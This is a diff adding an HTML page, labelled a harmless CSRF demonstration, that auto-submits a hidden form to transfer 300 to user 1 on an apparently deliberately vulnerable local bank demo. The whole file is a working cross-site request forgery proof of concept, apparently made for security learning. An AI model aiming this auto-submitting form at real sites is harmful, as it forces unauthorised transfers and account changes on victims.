@@ -1,0 +1,19 @@
+<!DOCTYPE html>
+<html>
+<body>
+
+<h3>This is a harmless CSRF demonstration</h3>
+
+<p>When the page loads, it will automatically POST to your local PHP file.</p>
+
+<form id="csrfForm" action="http://127.0.0.1/vuln_bank_demo/transfer.php" method="POST">
+    <input type="hidden" name="to_user" value="1">
+    <input type="hidden" name="amount" value="300">
+</form>
+
+<script>
+    document.getElementById('csrfForm').submit();
+</script>
+
+</body>
+</html>
